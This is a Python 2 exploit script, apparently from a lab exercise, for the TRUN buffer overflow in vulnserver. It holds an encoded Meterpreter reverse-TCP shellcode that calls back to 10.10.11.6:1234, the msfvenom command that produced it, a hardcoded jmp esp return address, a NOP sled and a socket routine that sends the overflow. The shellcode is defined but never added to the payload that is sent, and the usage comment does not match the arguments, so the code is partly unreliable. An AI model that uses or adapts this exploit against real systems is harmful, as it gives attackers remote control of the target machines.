#!/usr/bin/env python
# for TRUN command, we need 2006 bytes of garbage for the exploit
# python fuzzer.py 2006 2010 4 10.10.10.186 9999

import sys
import socket

ip = sys.argv[1]
port = int(sys.argv[2])

# generated with: 
# -b == bad characters --> we can't use a NULL char in our encoded payload
# the null char would have ended the strcpy that we are exploiting the the vulnserver
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.11.6 LPORT=1234 -f python -b \x00 -e x86/shikata_ga_nai
buf =  ""
buf += "\xd9\xc7\xbb\xe8\xb1\x32\xe3\xd9\x74\x24\xf4\x5d\x29"
buf += "\xc9\xb1\x54\x31\x5d\x18\x03\x5d\x18\x83\xed\x14\x53"
buf += "\xc7\x1f\x0c\x16\x28\xe0\xcc\x77\xa0\x05\xfd\xb7\xd6"
buf += "\x4e\xad\x07\x9c\x03\x41\xe3\xf0\xb7\xd2\x81\xdc\xb8"
buf += "\x53\x2f\x3b\xf6\x64\x1c\x7f\x99\xe6\x5f\xac\x79\xd7"
buf += "\xaf\xa1\x78\x10\xcd\x48\x28\xc9\x99\xff\xdd\x7e\xd7"
buf += "\xc3\x56\xcc\xf9\x43\x8a\x84\xf8\x62\x1d\x9f\xa2\xa4"
buf += "\x9f\x4c\xdf\xec\x87\x91\xda\xa7\x3c\x61\x90\x39\x95"
buf += "\xb8\x59\x95\xd8\x75\xa8\xe7\x1d\xb1\x53\x92\x57\xc2"
buf += "\xee\xa5\xa3\xb9\x34\x23\x30\x19\xbe\x93\x9c\x98\x13"
buf += "\x45\x56\x96\xd8\x01\x30\xba\xdf\xc6\x4a\xc6\x54\xe9"
buf += "\x9c\x4f\x2e\xce\x38\x14\xf4\x6f\x18\xf0\x5b\x8f\x7a"
buf += "\x5b\x03\x35\xf0\x71\x50\x44\x5b\x1d\x95\x65\x64\xdd"
buf += "\xb1\xfe\x17\xef\x1e\x55\xb0\x43\xd6\x73\x47\xa4\xcd"
buf += "\xc4\xd7\x5b\xee\x34\xf1\x9f\xba\x64\x69\x36\xc3\xee"
buf += "\x69\xb7\x16\x9a\x6c\x2f\x93\x51\x64\xa9\xcb\x67\x7a"
buf += "\xb1\xd9\xe1\x9c\xe9\x8d\xa1\x30\x49\x7e\x02\xe1\x21"
buf += "\x94\x8d\xde\x51\x97\x47\x77\xfb\x78\x3e\x2f\x93\xe1"
buf += "\x1b\xbb\x02\xed\xb1\xc1\x04\x65\x30\x35\xca\x8e\x31"
buf += "\x25\x3a\xef\xb9\xb5\xba\x9a\xb9\xdf\xbe\x0c\xed\x77"
buf += "\xbc\x69\xd9\xd7\x3f\x5c\x59\x1f\xbf\x21\x68\x6b\x89"
buf += "\xb7\xd4\x03\xf5\x57\xd5\xd3\xa3\x3d\xd5\xbb\x13\x66"
buf += "\x86\xde\x5c\xb3\xba\x72\xc8\x3c\xeb\x27\x5b\x55\x11"
buf += "\x11\xab\xfa\xea\x74\xa8\xfd\x15\x0a\x8c\xa5\x7d\xf4"
buf += "\x90\x55\x7e\x9e\x10\x06\x16\x55\x3f\xa9\xd6\x96\xea"
buf += "\xe2\x7e\x1c\x7a\x40\x1e\x21\x57\x04\xbe\x22\x5b\x9d"
buf += "\xd7\xac\x9c\x22\xd8\x4e\xa1\xf4\xe1\x24\xe2\xc4\x55"
buf += "\x36\x59\x68\xff\xdd\xa1\x3e\xff\xf7"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # if there is no response from the server within 5 seconds, error out
    s.settimeout(5)
    s.connect((ip, port))
    
    # grab the banner
    print s.recv(1024)

    # generate string of garbage to try to provoke a crash
    # we know we need 2006 A's to land in the ESP register
    #garbage = "A" * 2006 + "BBBB" + "C" * 4
    garbage = "A" * 2006
    # from disassembling the vulnserver, we know that the jmp esp instruction
    # is at 62 50 11 AF --> reverse to change the endianness for the proc arch
    ret = "\xAF\x11\x50\x62"
	# create nop sled
    nop = "\x90" * 24

    # sending a period after the TRUN command will crash the program
    badstr = "TRUN ." + garbage + ret + nop + '\r\n'
    
    s.send(badstr)

    # check for a response from the server
    # the response for a TRUN command that has completed 
    # successfully is "TRUN COMPLETE"
    # if the server crashes, it will not send a response and will timeout
    s.recv(1024)

    s.close()
except:
    print "*******************"
    print "*     CRASH!!     *"
    print "*******************"

